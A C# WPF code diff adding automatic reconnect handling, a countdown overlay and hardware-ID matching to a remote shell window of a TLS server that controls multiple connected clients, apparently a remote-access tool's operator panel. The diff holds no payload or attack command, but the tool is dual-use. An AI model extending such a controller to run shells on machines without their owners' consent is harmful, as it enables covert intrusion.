@@ -10,6 +10,9 @@ public partial class RemoteShellWindow : Window
 {
     private readonly TlsServer _server;
     private readonly List<ConnectedClient> _clients;
+    private readonly HashSet<string> _hwids;
+    private System.Windows.Threading.DispatcherTimer? _reconnectTimer;
+    private int _reconnectCountdown;
 
     public RemoteShellWindow(TlsServer server, List<ConnectedClient> clients)
     {
@@ -18,6 +21,7 @@ public partial class RemoteShellWindow : Window
 
         _server = server;
         _clients = clients;
+        _hwids = new HashSet<string>(clients.Select(c => c.Hwid).Where(h => !string.IsNullOrEmpty(h)));
 
         if (clients.Count == 1)
             TxtTitle.Text = $"— {clients[0].Id}";
@@ -26,17 +30,61 @@ public partial class RemoteShellWindow : Window
 
         _server.ShellOutputReceived += OnShellOutput;
         _server.ClientDisconnected  += OnClientDisconnected;
+        _server.ClientConnected     += OnClientConnected;
         Closed += (_, _) =>
         {
+            _reconnectTimer?.Stop();
             _server.ShellOutputReceived -= OnShellOutput;
             _server.ClientDisconnected  -= OnClientDisconnected;
+            _server.ClientConnected     -= OnClientConnected;
         };
     }
 
     private void OnClientDisconnected(ConnectedClient c)
     {
         if (!_clients.Any(x => x.Id == c.Id)) return;
-        Dispatcher.BeginInvoke(Close);
+        _clients.RemoveAll(x => x.Id == c.Id);
+        Dispatcher.BeginInvoke(() =>
+        {
+            if (_clients.Count > 0) return; // still have other clients connected
+
+            _reconnectCountdown = 60;
+            TxtReconnectCountdown.Text = $"Reconnecting... ({_reconnectCountdown}s)";
+            ReconnectOverlay.Visibility = Visibility.Visible;
+            ServerWindow.ReportGlobalActivity("⚡ Connection lost", "Shell", "failed");
+
+            _reconnectTimer?.Stop();
+            _reconnectTimer = new System.Windows.Threading.DispatcherTimer { Interval = TimeSpan.FromSeconds(1) };
+            _reconnectTimer.Tick += (_, _) =>
+            {
+                _reconnectCountdown--;
+                TxtReconnectCountdown.Text = $"Reconnecting... ({_reconnectCountdown}s)";
+                if (_reconnectCountdown <= 0)
+                {
+                    _reconnectTimer.Stop();
+                    ServerWindow.ReportGlobalActivity("✗ Reconnect timeout", "Shell", "failed");
+                    Close();
+                }
+            };
+            _reconnectTimer.Start();
+        });
+    }
+
+    private void OnClientConnected(ConnectedClient c)
+    {
+        if (!_hwids.Contains(c.Hwid)) return;
+        Dispatcher.BeginInvoke(() =>
+        {
+            _clients.Add(c);
+
+            // Hide overlay, cancel timer
+            _reconnectTimer?.Stop();
+            ReconnectOverlay.Visibility = Visibility.Collapsed;
+
+            TxtOutput.AppendText("\n--- Session reconnected ---");
+            OutputScroller.ScrollToEnd();
+            ServerWindow.ReportGlobalActivity("✓ Reconnected (Shell)", c.Id, "complete");
+        });
     }
 
     private void OnShellOutput(string clientId, string output)
